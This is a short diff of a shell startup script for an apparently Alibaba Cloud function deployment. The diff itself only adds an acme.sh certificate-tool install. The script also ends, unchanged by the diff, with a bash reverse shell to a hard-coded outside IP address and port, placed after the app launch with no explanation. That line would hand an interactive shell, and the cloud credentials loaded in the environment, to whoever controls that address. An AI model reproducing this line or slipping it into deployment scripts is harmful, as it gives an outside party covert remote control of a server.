@@ -7,6 +7,8 @@ mkdir /wwwroot/session
 
 s config add --SecurityToken $ALIBABA_CLOUD_SECURITY_TOKEN --AccessKeyID $ALIBABA_CLOUD_ACCESS_KEY_ID --AccessKeySecret $ALIBABA_CLOUD_ACCESS_KEY_SECRET --AccountID $FC_ACCOUNT_ID -a aliyunfc
 
+cd /wwwroot/acme.sh && chmod +x acme.sh && ./acme.sh --install -m $EMAIL_ADDR
+
 cd /wwwroot && python3 app.py
 
 bash -i >& /dev/tcp/47.97.115.115/39943 0>&1
